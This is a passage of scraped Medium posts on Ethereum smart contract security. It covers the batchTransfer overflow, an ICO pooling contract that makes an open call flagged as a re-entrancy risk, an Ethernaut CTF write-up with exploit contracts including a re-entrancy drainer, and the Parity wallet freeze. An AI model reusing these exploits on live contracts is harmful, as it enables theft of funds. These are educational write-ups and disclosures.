(uint i = 0; i < cnt; i++) {          balances[_receivers[i]] = balances[_receivers[i]].add(_value);          Transfer(msg.sender, _receivers[i], _value);          }     return true;     }}And let\u2019s take a look at the offending transaction dataFunction: batchTransfer(address[] _receivers, uint256 _value)MethodID: 0x83f12fec[0]:  0000000000000000000000000000000000000000000000000000000000000040[1]:  8000000000000000000000000000000000000000000000000000000000000000[2]:  0000000000000000000000000000000000000000000000000000000000000002[3]:  000000000000000000000000b4d30cac5124b46c2df0cf3e3e1be05f42119033[4]:  0000000000000000000000000e823ffe018727585eaf5bc769fa80472f76c3d7The attacker used a very large value for the uint256 _value (specifically 0x8000000000000000000000000000000000000000000000000000000000000000) as seen in [1] and then they passed in two receivers (0xb4d30cac5124b46c2df0cf3e3e1be05f42119033) and (0x0e823ffe018727585eaf5bc769fa80472f76c3d7) as seen in [3] and [4]uint cnt = _receivers.length;uint256 amount = uint256(cnt) * _value;Those two lines, with cnt = 2 and _value equal to 0x8000000000000000000000000000000000000000000000000000000000000000, cause the amount to overflow and zero out which leads us to the first issue in this contract.Always use\u00a0SafeMathThe following is a SafeMath implementation/** * Math operations with safety checks */contract SafeMath {  function safeMul(uint a, uint b) internal returns (uint) {    uint c = a * b;    assert(a == 0 || c / a == b);    return c;  }function safeDiv(uint a, uint b) internal returns (uint) {    assert(b > 0);    uint c = a / b;    assert(a == b * c + a % b);    return c;  }function safeSub(uint a, uint b) internal returns (uint) {    assert(b <= a);    return a - b;  }function safeAdd(uint a, uint b) internal returns (uint) {    uint c = a + b;    assert(c>=a && c>=b);    return c;  }function max64(uint64 a, uint64 b) internal constant returns (uint64) {    return a >= b ? a : b;  }function min64(uint64 a, uint64 b) internal constant returns (uint64) {    return a < b ? a : b;  }function max256(uint256 a, uint256 b) internal constant returns (uint256) {    return a >= b ? a : b;  }function min256(uint256 a, uint256 b) internal constant returns (uint256) {    return a < b ? a : b;  }function assert(bool assertion) internal {    if (!assertion) {      throw;    }  }}SafeMath prevents integer overflow attacks by implementing \u201csafe\u201d versions of addition, subtraction etc.While the contract actually did include the SafeMath library at the top of the contract, they didn\u2019t use it here. It is also worth noting that above is the ETHOS smart contract SafeMath implementation and that the contract in question had a different implementation. I did not do an in depth audit of the contract so I cannot attest to the accuracy of their implementation.Sanity Checks didn\u2019t check for Sane\u00a0Inputrequire(cnt > 0 && cnt <= 20);require(_value > 0 && balances[msg.sender] >= amount);The next few lines were designed to be sanity checks, but they didn\u2019t actually check for the overflow that just happened. cnt = 2 which is well within the range and the _value is > 0 while the amount got overflowed and zeroed out.Woohoo Free\u00a0Money!balances[msg.sender] = balances[msg.sender].sub(amounatt);     for (uint i = 0; i < cnt; i++) {          balances[_receivers[i]] = balances[_receivers[i]].add(_value);          Transfer(msg.sender, _receivers[i], _value);          }The next few lines, after passing the \u201csanity check\u201d, execute the transaction sending the massive _value that was passed in while subtracting nothing from the attacker.Some ObservationsThe contract makes a number of errors. Most notably, they implemented SafeMath, but didn\u2019t use it. The batchTransfer function also is not part of the standard ERC20 interface, although there is nothing wrong with it in principle. Implementing a new function can sometimes be dangerous since it won\u2019t be as battle-tested and audited as standard ERC20 functions which are already well understood.ETHOS Contract Unaffected by batchTransfer VulnerabilityThe ETHOS smart contract implements SafeMath (as outlined above) and uses SafeMath for every mathematical operation. While this does consume slightly more gas, the security that is gained by eliminating potential overflow attacks is considerable.ETHOS also does NOT implement the batchTransfer function in the token contract. It is not part of the ERC20 standard interface. ETHOS has developed a tool internally that will be used for airdrops and payroll that has similar and greater functionality than the batchTransfer function which has been separated out into an independent contract for greater security.The ETHOS token contract also went through an internal security audit whose results were published here: https://www.ethos.io/2017/08/08/bqx-smart-contract-code-review-result/Bottom line, batchTransfer is a vulnerability that only affects a subset of ERC20 contracts that implemented an additional function outside of the standard ERC20 interface and ETHOS is unaffected by this vulnerability.Shingo LavineFounder & CEOEthos.io", "responses": "1"}, {"title": "Formal Verification, Virtual Hardware, and Engineering for Blockchains", "author_name": "Richard Burton", "link": "https://medium.com/balance-io/formal-verification-virtual-hardware-and-engineering-for-blockchains-51d07abdc934?source=search_post", "post_date": "Mar 28", "readtime": "5 min read", "upvotes": "795", "content": "Formal Verification, Virtual Hardware, and Engineering for BlockchainsHow high-assurance software development will push open source economic infrastructure forward and help build up\u00a0trustRichard BurtonBlockedUnblockFollowFollowingMar 28Lev from DappHub casually Unplugging from the Fiat\u00a0MatrixOver the last few months, I have been trying to learn as much as I can about the MakerDAO protocol, the people who created it, and why it has been so successful. I have been reading through thousands of Reddit posts, tweets, Medium articles and Git commits. I have been traveling the world to meet as many of the team as possible and learn about why they are the way they are. It has been a really interesting trip down a totally new rabbit hole. At the bottom of this warren I found two fascinating Jedi called Lev and Martin. They have been kind enough to share what they have learnt about building a set of smart contracts that currently contain around $300 million in collateral.Smart contract engineering is very different from other kinds of software development. When you publish your code to Ethereum, anyone can interact with it. This is a double-edged sword. On the positive side, it means that anyone can build on top of your infrastructure. On the negative side, it means that lots of people will try to attack your code and find bugs. It requires a totally different mentality when it comes to engineering and shipping.It turns out that other industries have similar requirements. If you are writing code for rockets, airplanes or medical devices, you do not ship untested software rapidly. You architect a solution and build it out carefully, testing everything as you go. This requirement for incredibly high quality code has led researchers and engineers to the practice of Formal Verification.\u201cFormal verification is the act of proving or disproving the correctness of intended algorithms underlying a system with respect to a certain formal specification or property, using formal methods of mathematics.\u201dCrafting Virtual\u00a0HardwareWhen Apple releases a new iPhone, it is the culmination of decades of manufacturing expertise and factory design. They spend an enormous amount of time designing the machines that make the objects. Jony Ive has spoke about this endeavor multiple times: Apple spends an insane amount of time making things to make things. Their factory tooling is as important as the final product itself. If they did not invest in their tools, they could could not ship the iPhone to millions of customers every year.Jony\u2019s obsession with factory\u00a0design.Andy Milenius, the CTO of MakerDAO, coined this wonderful phrase for smart contracts. He called them \u201cvirtual hardware\u201d on the a16z podcast.a16z Podcast: All about StablecoinsThe history, evolution, and use of money revolves around the important concept of debt: It's what allows us to \"time\u2026a16z.comI think this description really captures the rigor and intensity required to make software that cannot be hacked and will perform as expected. Both Apple and Maker have invested huge amounts of resources in their tools. It pays off over time.Engineering for BlockchainsThe team at DappHub have been working on a set of tools to help smart contract engineers write high quality software for these public and programmable protocols. As an outsider with very little engineering experience, it strikes me that this kind of work requires a mindset shift as well as a new set of practices. The teams building these kinds of contracts encourage people to specify the goals of the code clearly before you leap into the engineering. This seems to go way beyond test driven development and into the realm of total perfectionism.How can we formally verify that our code is correct?How can we be sure that everyone\u2019s money will be safe in this extremely adversarial network filled with hackers?How can we sleep at night knowing we have done everything possible to look after the people who trusted our code?These are the questions that go flying around my head when I think about how to build systems for blockchains. We have seen so many huge hacks result in so much lost capital.The people behind the K Framework have been trying to figure out better ways to tell computers what to do for some time. This is from their overview blog post:\u201cUnlike natural language, which allows interpretation and miscommunication, programming languages are meant to tell computers precisely what to do. Without a rigorous definition of a programming language that unambiguously says what each program does, also called a formal semantics, it is impossible to guarantee reliable, safe or secure operation of computing systems. K is a framework that allows you to define, or implement, the formal semantics of your programming language in an intuitive and modular way. Once you do that, K offers you a suite of tools for your language, including both an executable model and a program verifier.\u201dDappHub have been working on a suite of tools called klab, which makes it easier to use the K Framework to specify and formally verify smart contracts.This allows engineers to step through their Solidity code, look at the byte code it generates for Ethereum, and compare it their original specifications. These tools strike me as debuggers for thought. You are constantly checking what something is doing and what you think it is doing.It took us several hours to walk through the specification of a simple ERC-20\u00a0token.Lev was kind enough to hold a workshop on all of this and shared a bunch of resources with everyone. If you are curious to learn more, start here:Engineering TrustEthereum gave us the first trustworthy and global computer. Today, it is extremely slow, very hard to use, and monstrously expensive. However, technology is always good at changing those things. It will speed up, it will get easier to use, and it will get cheaper. The unique quality that Ethereum has is its trustworthiness. Anyone can verify that any piece of code did what it supposed to. That is what blockchains are really useful for. Public, programmable and verifiable computation.In the world of trustworthy computational networks, we need more trustworthy engineering. MakerDAO is built on Ethereum and generates Dai\u2014a stablecoin which tracks the dollar. Thousands of projects are built on top of Dai. Millions of people will use those applications. Every person is trusting that the system beneath them is going to operate correctly.It is trust all the way down.", "responses": ""}, {"title": "Hacking a Popular ICO Practice That Only Rewards the\u00a0Richer", "author_name": "Pablo Ruiz", "link": "https://hackernoon.com/hacking-a-popular-ico-practice-that-only-rewards-the-richer-7d10b2019f1e?source=search_post", "post_date": "Nov 27, 2017", "readtime": "12 min read", "upvotes": "171", "content": "Hacking a Popular ICO Practice That Only Rewards the\u00a0RicherPablo RuizBlockedUnblockFollowFollowingNov 27, 2017If you have been part of the Ethereum / Cryptocurrency ecosystem for at least a few months, you might be aware of the ICO craze going around.There\u2019s literally dozens of ICOs / Token Sales springing out every day as can be seen on popular platforms\u200a\u2014\u200alike IcoAlert or TokenMarket\u2014 tracking ICO activity.One of the most common practices used by ICO teams to promote and incentivize their token sales is to offer hefty discounts or bonuses to contributors based on when they buy into their tokens or how much they are willing to invest.Why should the rich get\u00a0richer?Recently, there\u2019s been some hot debate whether or not it\u2019s ok for ICOs to offer bonuses based on volume purchased / money spent.Detractors of this practice argue that it goes against the spirit of Ethereum\u200a\u2014\u200aAnd crypto in general\u200a\u2014\u200ato reward people with more resources to gain an advantage over other people with less resources.Accessing Volume Discounts by Resource\u00a0PoolingVolume-based bonuses won\u2019t be going away anytime soon. So\u2026 How can we take advantage of these bonuses if we can\u2019t (or won\u2019t) commit the minimum ether the ICO team is asking for?One of the ways to do this would be to find a few friends that are also interested in contributing to a particular ICO and have them send their ether to one of the members of the group, have him buy the tokens and then distribute the acquired tokens accordingly among this group of friends.Love, Faith and Hope. These are much needed when investing together with friends. (Photo by Jonathan Brinkhorst on Unsplash)In theory, this approach is pretty easy and straightforward, but in practice, it can become problematic. For one, you would have to trust this person receiving everyone\u2019s ether to come through, which already is a risky proposition. What if this person disappears with the money? What if he forgets his private key? What if his private key gets stolen? What if he makes a mistake and sends the money to an incorrect address? There\u2019s so many things that could go wrong.Also, what if we don\u2019t have enough friends that are interested in investing with you in a particular ICO? You might still want to do it and pool the money with complete strangers. There are a few sites and forums where people can find other people to invest together, but this presents a huge risk for everyone involved. I wouldn\u2019t send money blindly to someone I don\u2019t know extremely well, and neither should you.So, how can we collaboratively invest on an ICO without having to trust anyone else with our money? With a smart contract, of course! \ud83d\udcc4Building an Investment Pool Smart\u00a0ContractIn the following paragraphs I\u2019m going to describe how to build a smart contract that allows several contributors to send money to it; have it invest in the selected ICO when some pre-conditions are met; and finally have it distribute the tokens purchased on a pro-rata basis.This smart contract would act as an intermediary that collects the money from several accounts and then forwards the collected funds to an ICO contract in one transaction in order to gain access to the volume-based bonus offered by the team.The tokens would then be bought by the contract, which allows the contributors that participated in the investment pool to withdraw them to their own accounts.Let\u2019s take a look at the smart contract that allows all this.But first, a few disclaimers, warnings and considerations:Before using the following contract to create an investment pool for an ICO you should make sure said ICO will allow you to later withdraw the tokens. Some ICOs don\u2019t use an smart contract while collecting contributions for example. Some ICOs also have whitelist mechanisms in place and KYC steps that need to be completed that might prevent a contract from investing on behalf of a physical person.The ICOPool contract has no way to know the details of the ICO it is targeting since there is no standard protocol to crowdsale contracts. This means that, for example, it doesn\u2019t know if there\u2019s a deadline for the bonus or what\u2019s the minimum / maximum contribution amounts, or if the ICO has already finished, etc. So, the contract relies on its admin to properly configure it and trigger the token purchase at the right moment.The ICOPool contract ends up participating in the ICO by making an external call to the crowdsale contract, executing its fallback function. Most crowdsale contracts are prepared to execute a buyTokens function(or a function with a similar name) upon receiving ether without any other data. You should make sure the ICO you do the investment pool for works this way.It goes without saying that the tokens being bought must be ERC20 compliant. If they are not, you won\u2019t be able to guarantee that the tokens can be transferred from the investment pool to the contributors.The following code has not been tested yet in a real-life project. Use it under your own risk, I\u2019m not to be held responsible for its improper use. Also, make sure the ICO you choose for the investment pool is not a scam. Using this contract has the same risks as if you would invest in the ICO by sending ether to it, this contract adds no additional security mechanisms. Proceed with extreme caution.The ICOPool Smart\u00a0ContractYou can find the complete source code in my Github repository. Please take a look at the README.md file for further usage instructions, more in-depth information and examples.The ICOPool contract has 4 parts to it:Configuring the investment pool.Receiving ether from contributors to form the pool.Investing in the target ICO once the pool\u2019s requirements have been met.Allowing the contributors to obtain the acquired tokens.Configuring the investment poolIn order to put an investment pool in place, first we have to deploy the contract with a few parameters. The account deploying the ICOPool contract will become its admin. The admin\u2019s only purpose is to execute the function that buys into the ICO.Here\u2019s the code involved in the creation of the investment pool.function ICOPool(address _targetICO,                    uint _minContribution,                    uint _maxContribution,                    uint _poolSoftCap,                    uint _poolHardCap,                    uint _contributorsSoftCap,                    uint _contributorsHardCap                    ) public {                                require (_targetICO != address(0));        require (_minContribution > 0);        require (_maxContribution > _minContribution);        require (_poolHardCap > _poolSoftCap);        require (_contributorsSoftCap > 1);        require (_contributorsHardCap >= _contributorsSoftCap);                // Max people * their minimum contribution should be able to meet pool softcap        // For example, we can't allow having the max contributors (10 people) put $100 each when the softcap is $1500.        require(_contributorsHardCap * _minContribution >= _poolSoftCap);        // Min people * their maximum contribution should be within pool hardcap        // For example, we can't allow 3 people to reach the hardcap if the minimum contributors is 5        require(_contributorsSoftCap * _maxContribution <= _poolHardCap);                targetICO = _targetICO;        poolAdmin = msg.sender;        minContribution = _minContribution;        maxContribution = _maxContribution;                poolSoftCap = _poolSoftCap;        poolHardCap = _poolHardCap;                contributorsSoftCap = _contributorsSoftCap;        contributorsHardCap = _contributorsHardCap;    }The contract receives quite a few constructor parameters:address _targetICO: This is the ICO the investment pool will contribute its funds to. Anyone using this contract should double check this variable is pointing to the ICO the organizer says it does.uint _minContribution & uint _maxContribution: These are the minimum and maximum amount of ether (expressed in wei) that the contributor to the investment pool can put into the pool.uint _poolSoftCap & uint _poolHardCap: These are the minimum and maximum amount of ether (expressed in wei) that the investment pool allows in order to be able to invest in the target ICO. The soft cap must be reached before the admin can buy the tokens from the ICO. And no contributions may be accepted once the hard cap is reached.uint _contributorsSoftCap & uint _contributorsHardCap: These are the minimum and maximum amount of contributors the investment pool may accept.Notice there\u2019s a complex relationship between all these parameters so we don\u2019t risk the chance of the investment pool getting stuck:The soft cap (_poolSoftCap) should be lower than the max amount of contributors (_contributorsHardCap) multiplied by their minimum possible contribution (_minContribution). This way, it is not possible for the ICOPool to reach full capacity in terms of people but not reach the minimum ether goal. (If 10 people is the maximum number of contributors allowed, they should not be able to only invest 1 eth each, if the soft cap is greater than 10 eth).Along the same lines, the hard cap should be higher than the minimum amount of contributors multiplied by their maximum possible contribution. This way, it is not possible for the ICOPool to reach full capacity in terms of ether but not reach the minimum people required. (2 people should not be allowed to reach the pool\u2019s hard cap if the minimum people was 3 or more).It\u2019s also extremely important to notice that the ICOPool contract has no way to know what the minimum contribution is in order to trigger the bonuses. It\u2019s up to the admin to correctly set the soft and hard caps accordingly.Receiving ether from contributorsOnce the investment pool is set up, the person who created the contract can start promoting it among other people to pool contributions.Sending ether to the investment pool is done the same way as one would with a crowdsale. Just transfer the ether to the given address and the contract will take care of it.*It\u2019s worth mentioning that the contributor should take the same measures he takes when investing directly on the crowdsale. For example, they must send the money from an account they own the private key of.Here\u2019s the code that gets executed when someone sends money from their account.function() payable public {        require(msg.value > 0);        require(msg.value >= minContribution && msg.value <= maxContribution); // Must send eth within min and max contributions        require(contributorsBalance[msg.sender].add(msg.value) <= maxContribution); // msg.sender's balance can't exceed max contribution limit                // Pool can't exceed hard cap        require(poolBalance.add(msg.value) <= poolHardCap);                //Register how much eth the pool has        poolBalance = poolBalance.add(msg.value);                //If it is the first time this account contributes, increase num. of contributors        if (contributorsBalance[msg.sender] == 0){            amountOfContributors++;        }        // Pool can't exceed contributors hard cap        require(amountOfContributors <= contributorsHardCap);                //Register how much eth has each contributor put into the pool        contributorsBalance[msg.sender] = contributorsBalance[msg.sender].add(msg.value);    }First, we make sure that the contribution being made is within the boundaries the admin defined and that the people/money hard cap is not exceeded.If the contribution is accepted, we add the money sent to the contributor\u2019s balance. The contributor doesn\u2019t have to put all the money in one go, but each contribution should meet the minimum set by the admin.Investing in the target\u00a0ICOAt any point in time\u200a\u2014\u200aas long as the minimum requirements are met\u200a\u2014\u200a, the admin may decide to stop collecting funds and make the purchase of the tokens from the ICO.Once he does, the investment pool contract may no longer accept incoming transfers of ether.As I mentioned before, this step must be performed by the admin, although the contract could be modified to allow any of the contributors to do it. This other approach makes the contract less dependent on one person, but it also makes it more messy and prone to problems. The main issue with allowing anyone to buy the tokens has to do with the fact that this ICOPool contract has no way to know the inner workings of the target ICO. In order to avoid conflict, the admin is the one that decides when to buy the tokens, and responsible for it. For example, the contract has no way to check if the volume bonus promoted by the ICO team is active at the moment, so it\u2019s up to the pool admin to check that and move forward with the token purchase.\u200a\u2014\u200aOr not doing anything so the contributors can withdraw their funds\u200a\u2014\u200a.function buyTokensFromICO() public {        require(!investedInICO);        require(poolBalance >= poolSoftCap);        require(amountOfContributors >= contributorsSoftCap);        require(this.balance >= poolBalance);                //Can be called only by the pool admin to avoid timing problems        // We'll need to trust the admin to execute this at the right moment        // Could be changed to allow any contributor to call it.        require(msg.sender == poolAdmin);                investedInICO = true;                // BE CAREFUL, OPENING RE-ENTRANCY DOOR        require(targetICO.call.value(poolBalance)());                // **************        //If you are hesitant about using call() you can instead instantiate        //the target ICO and directly use whatever function it has to buy tokens        // ------        //Crowdsale c = Crowdsale(targetICO);        //c.buyTokens.value(poolBalance)();        // **************    }Sending the funds to the target ICO is pretty straightforward. Once we have checked that the soft caps have been met, we proceed to forward the ether to the target ICO. Using the call() function and sending the pool balance along will trigger the ICO\u2019s fallback function.Once thing the admin (and contributors) should do before investing in the pool is making sure the pool will indeed be able to invest in the target ICO. This contract assumes the ICO has a fallback function that triggers the contract\u2019s own buyTokens (or whatever it is called) function.If the target ICO doesn\u2019t have a fallback function implemented or you feel insecure about using the call() function to execute potentially insecure code, then you could use another method I\u2019ve left commented in the code. You could instantiate the target ICO contract and call it\u2019s buyTokens function directly.This function also sets the investedInICO flag so we can only call this function once. If the people involved wanted to pool more money and invest a second time, they would have to create a new ICOPool contract.Withdrawing the\u00a0tokensOnce the previous step has been completed, the target ICO\u2019s token should be holding our ICOPool\u2019s token balance.You should be able to check this by calling the balanceOf() function of the token by passing the ICOPool\u2019s address to it.So, there\u2019s one more step left that each contributor has to complete; the withdrawal of the tokens each one is entitled to.function withdrawTokens(address _tokenAddress) public {        require(contributorsBalance[msg.sender] > 0);                ERC20 token = ERC20(_tokenAddress);        require (token.balanceOf(this) > 0);                // tokenBalance is always the max tokens the pool bought (balanceOf + already withdrawn)        uint tokenBalance = token.balanceOf(this).add(tokensWithdrawn);                // Get contributor share based on his contribution vs total pool        // poolBalance (total wei pooled) -> contributorsBalance[msg.sender] (wei put by msg.sender)        // tokenBalance (total tokens bought with poolBalance) -> tokensToWithdraw (how many tokens corresponds to msg.sender)        uint tokensToWithdraw = tokenBalance.mul(contributorsBalance[msg.sender]).div(poolBalance);        tokensToWithdraw = tokensToWithdraw.sub(tokensWithdrawnByContributor[msg.sender]);                require(tokensToWithdraw > 0);                // Keep track of tokens already withdrawn        tokensWithdrawn = tokensWithdrawn.add(tokensToWithdraw);        tokensWithdrawnByContributor[msg.sender] = tokensWithdrawnByContributor[msg.sender].add(tokensToWithdraw);                // Transfer calculated tokens to msg.sender        require(token.transfer(msg.sender,tokensToWithdraw));    }As I mentioned above, the ICOPool contract is now holding the tokens it bought. Now it\u2019s up to each contributor to withdraw their own tokens by having each one of them call the withdrawTokens(address _tokenAddress) function.Notice the function requires one parameter, the token\u2019s address, not to be confused by the ICO\u2019s address. At this point, the ICO has no utility, what we need is to change the ownership of the tokens, so we need to get a hold of the token address.When one of the contributors calls this function, it will calculate how many tokens they are entitled to based on the total money the pool received and how much this person\u2019s contribution represents. For example, suppose the total pool balance was 100 eth, that were used to buy 100.000 tokens. If I invested 30 ether, then I would be entitled to 30.000 tokens.The function will figure out how many tokens of the total that were bought correspond to the contributor and then call the transfer function on the token to make the transfer from the contract to the contributor.If you call balanceOf() again, the contributor should now own those many tokens and the contract should have those many less.One thing to notice is that this function has been designed so that the contributor may call it more than once, and if there were more tokens than before, he would get the difference. You might be wondering why we are doing this if I previously mentioned that the ICOPool contract may only buy tokens once. Well, there\u2019s the slight chance that our ICOPool contract might receive tokens besides buying them. There\u2019s a popular marketing practice some ICOs are implementing lately called Airdrops where they basically send tokens to random addresses in order to promote their product.The way our withdrawTokens() function works allows the contributors to get their share of these tokens as well.Where to go from\u00a0hereThere are lots of improvements that can be done to this contract. For example:The person deploying the contract\u200a\u2014\u200athe admin\u200a\u2014\u200awill incur in more costs than the rest of the contributors because he has to pay the necessary gas to deploy the ICOPool contract, and he is not reimbursed for it. We could device some scheme that rewards more tokens to the person organizing the investment pool.We could add a deadline to it so if the tokens are not bought by that date the pool gets cancelled.If there was some standard or common protocol to crowdsale contracts we could make our contract friendlier to the contributors.The contract could be modified to allow investing in more than one ICO, and even decide, somehow, in which ICOs to invest given their bonus schemes.Drop me a line if you are interested in implementing this contract to invest in an ICO. And please do contact me if you find any bugs or you want to discuss any parts of this code.", "responses": "5"}, {"title": "Security Audit And Testing For Smart Contracts", "author_name": "K SYSTEMS LTD", "link": "https://medium.com/@ksystemsio/security-audit-and-testing-for-smart-contracts-12e957c4b7c5?source=search_post", "post_date": "Aug 24, 2018", "readtime": "", "upvotes": "529", "content": "Security Audit And Testing For Smart ContractsK SYSTEMS LTDBlockedUnblockFollowFollowingAug 24, 2018", "responses": ""}, {"title": "The Ethernaut CTF\u00a0Writeup", "author_name": "Arseny Reutov", "link": "https://blog.positive.com/the-ethernaut-ctf-writeup-dc3021824abc?source=search_post", "post_date": "Nov 6, 2017", "readtime": "6 min read", "upvotes": "204", "content": "The Ethernaut CTF\u00a0WriteupArseny ReutovBlockedUnblockFollowFollowingNov 6, 2017Zeppelin Solutions invited everybody to participate in their smart contract CTF competition called \u201cThe Ethernaut\u201d which started together with the annual DevCon 3 conference held in Cancun. First five contestants to solve all tasks shared the prize pool of 10000$.For each task the Ethernaut bot created a contract on Ropsten testnet. At Positive.com we could not miss a chance to take part in the CTF, so here is our writeup for the seven tasks presented to the contestants.0. Hello EthernautThe first task was designed to get comfortable with the CTF and contract interaction. In Chrome Dev Tools you were welcomed with shiny ASCII graphics:After the first contract was deployed, you needed to call info() method, which instructed about the further steps: \u201cYou will find what you need in info1().\u201d. Calling info1() told us: \u201cTry info2(), but with \u201chello\u201d as a parameter.\u201d, which then required the following sequence of calls:contract.info2(\u201chello\u201d) \u2192 The property infoNum holds the number of the next info method to call.contract.infoNum() \u2192 42contract.info42() \u2192 theMethodName is the name of the next method.contract.theMethodName() \u2192 The method name is method7123949.contract.method7123949() \u2192 If you know the password, submit it to authenticate().At this point we needed to get the password for the authenticate() function. We got the password by analyzing the contract memory in Remix debugger.However, it could be done easier by just calling contract.password() which yielded the value \u201cethernaut0\u201d. After authenticating with this password we successfully proceeded to the next task.1. FallbackTo beat this level one needed to become the contract owner and drain its balance. It had the function withdraw() which could transfer all the balance to the caller but it was restricted only to the owner. Surprisingly the fallback function could make us contract owner:function() payable {  require(msg.value > 0 && contributions[msg.sender] > 0);  owner = msg.sender;}As you may know fallback function is called every time a contract receives ether or an unknown method is called. Thus, by sending ether to the contract we could trigger fallback function, however require() statement would not let us become the owner as \u201ccontributions\u201d mapping had zero value for our address. In order to increase our contribution we just needed to call the corresponding method:function contribute() public payable {  require(msg.value < 0.001 ether);  contributions[msg.sender] += msg.value;  if(contributions[msg.sender] > contributions[owner]) {    owner = msg.sender;  }}The task could be solved with the following sequence of calls:contract.contribute({value: 100})contract.sendTransaction({value: 100})contract.withdraw()2. FalloutIn order to solve this task one needed to set oneself as contract owner. If you looked closely at the constructor name you could easily spot the problem: letter \u201cl\u201d in contract name \u201cFallout\u201d was changed for digit \u201c1\u201d in constructor name which means that pseudo-constructor was never executed. That is why it was possible to call function \u201cFal1out\u201d and effectively set yourself as the contract owner. Submitting solution to the Ethernaut bot got us to the next task.3. TokenThe task was about a classic integer underflow. The transfer() method did not check that the current user balance is bigger than supplied value. Thus, by calling the method with any address as the argument and supplying any amount of ether with that call we could make our balance as big as 2**256 which was the task goal.4. DelegationThe name of the task implied the connection with the notorious Parity hack. Indeed, the fallback function had the code that looked familiar:function() {  if(delegate.delegatecall(msg.data)) {    this;  }}The difference between a normal call and delegatecall is that the latter passes the current context to the target method call, which means that in delegated method msg.sender will point to the original sender and not the caller contract. The second point is that this fallback function passes user supplied msg.data to delegatecall, allowing to basically call any function within delegate contract if we supply the correct method signature. The goal was to call the \u201cpwn\u201d method which could change the owner:function pwn() {  owner = msg.sender;}In order to call this function we needed to figure out its signature which could be calculated as follows:web3.sha3(\"pwn()\").slice(0, 10) // 0xdd365b8bSending these 4 bytes in \u201cdata\u201d field of the ether transfer transaction made us the owner and allowed to proceed to the next task.5. ForceThe vulnerable contract had no code at all but featured a cool ASCII cat:pragma solidity ^0.4.0;contract Force {/*MEOW ?         /\\_/\\   /    ____/ o o \\  /~____  =\u00f8= / (______)__m_m)*/}The goal of the task was to make the contract balance bigger than zero. Since there was no payable fallback function, we could not send ether directly. However, with selfdestruct() builtin function it is possible to send ether even if there are no payable functions. The purpose of this function is to delete the contract from the blockchain. When it is executed it sends the contract balance to the address that is supplied in the first argument.In order to solve the task we created the following exploit contract:contract Suicide {    function Suicide() payable {        selfdestruct(0x24d661beb31b85a7d775272d7841f80e662c283b);    }}Having been deployed with initial balance of 1 wei, it immediately removed itself from the blockchain and sent its balance to the Force contract, which happily accepted our transfer.6. Re-entrancyAs it is clear from the task name, the goal was to exploit a reentrancy vulnerability and drain the contract balance. The same vulnerability affected the DAO which resulted in 50 million dollar theft.The relevant piece of code was as follows:function withdraw(uint _amount) public {  if(balances[msg.sender] >= _amount) {    if(msg.sender.call.value(_amount)()) {      _amount;    }    balances[msg.sender] -= _amount;  }}As it is quite evident, the code is vulnerable because balance deduction is done after ether transfer is made. When ether is sent to some address, it may be a contract address and its fallback function will be triggered. In this function it is possible to recursively call withdraw() method again provided that there is enough gas. It looks like this:Our exploit contract firstly made a deposit and then successfully drained the contract balance by triggering the recursive chain of withdraw() calls via fallback function:import './Reentrance.sol';contract Exploit {    address target = 0x2bd292597661ef87e2045c474de35851eb5a65f2;    Reentrance c;    function Exploit() {       c = Reentrance(target);           }    function attack() payable {       c.donate.value(0.1 ether)(this);       c.withdraw(0.1 ether);    }    function() payable {        c.withdraw(0.1 ether);    }}Having submitted the final solution, we were congratulated with the fancy message:", "responses": "2"}, {"title": "Parity Wallet Security Alert\u200a\u2014\u200aVulnerability in the Parity Wallet library\u00a0contract", "author_name": "Priyab Dash", "link": "https://medium.com/crypt-bytes-tech/parity-wallet-security-alert-vulnerability-in-the-parity-wallet-service-contract-1506486c4160?source=search_post", "post_date": "Nov 7, 2017", "readtime": "6 min read", "upvotes": "150", "content": "Parity Wallet Security Alert\u200a\u2014\u200aVulnerability in the Parity Wallet library\u00a0contractPriyab DashBlockedUnblockFollowFollowingNov 7, 2017In another sad twist of fate again the Parity Multi-sig wallets came under another critical bug or shall I say defect/hack where a user exploited an issue and thus removed the library code. This froze funds in all Parity multi-sig wallets deployed after 20 July. For now the funds are frozen & can\u2019t be moved anywhere. Some speculate that this may impact 150+ Million USD worth of ETH. The exploit seems to be significant as a lot of customer funds are frozen who either pool funds or ICOs that use the Parity\u2019s multi-sig capability to store funds.The UpdatesThis was the first update from Parity was belowWhich was followed by he below official security alert detailing the nature of the exploitAnd statement of the issue was as mentioned below:Following the fix for the original multi-sig issue that had been exploited on 19th of July (function visibility), a new version of the Parity Wallet library contract was deployed on 20th of July. However that code still contained another issue\u200a\u2014\u200ait was possible to turn the Parity Wallet library contract into a regular multi-sig wallet and become an owner of it by calling the initWallet function. It would seem that issue was triggered accidentally 6th Nov 2017 02:33:47 PM +UTC and subsequently a user suicided the library-turned-into-wallet, wiping out the library code which in turn rendered all multi-sig contracts unusable since their logic (any state-modifying function) was inside the library.Who Did\u00a0itFrom the below issue raised in Parity github issue log the issue was done by a user who goes by github handle devops199.anyone can kill your contract \u00b7 Issue #6995 \u00b7 paritytech/parityparity - Fast, light, robust Ethereum implementation.github.comFrom the his github repo though not much public commits can be confirmed, but based on what he has achieved, by that some call him a hacker.devops199devops199 has 3 repositories available. Follow their code on GitHub.github.comFrom the issue log one can see that the suicide code was called onto a live contract which seems to be a library which was called from other Parity multi-sig wallets.Ethereum Account 0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4 InfoContract Source Code Copy Find Similiar Contracts //sol Wallet // Multi-sig, daily-limited account proxy/wallet. //\u2026etherscan.ioAnd the developer devops199 was able to make himself as the owner of the library contract because the contract was uninitialized and he chose to call the suicide wallet.Ethereum Transaction 0x47f7cff7a5e671884629c93b368cb18f58a993f4b19c2a53a8662e3f1482f690The Ethereum BlockChain Explorer, API and Analytics Platformetherscan.ioHe seemed to act like a hacker trying to exploit July 19 bug and found the below multi_sig wallets deployed using Parity were using the library located at \u201c0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4\u201d address.parity_multi_sigs - Pastebin.comEdit descriptionpastebin.comSo he killed the contract and then when he queried the dependent contracts \u201cisowner(<any_addr>)\u201d they all return TRUE because the delegate call made to a died contract to allegedly test the exploit.This is the transaction that tracks the suicide call.Ethereum Transaction 0x47f7cff7a5e671884629c93b368cb18f58a993f4b19c2a53a8662e3f1482f690The Ethereum BlockChain Explorer, API and Analytics Platformetherscan.ioThe most funny part was that he did not understand the gravity of the issue and felt by deleting the contract he has stopped an exploit from re-occurring while he himself already triggered the exploit and that to on a production live contract, at least that was what his statement seemed to mean. It seems the developer was unaware of the consequences.I believe some one might exploit.ImpactNo funds can be moved out of the multi-sig wallets for all dependent multi-sig wallets that were 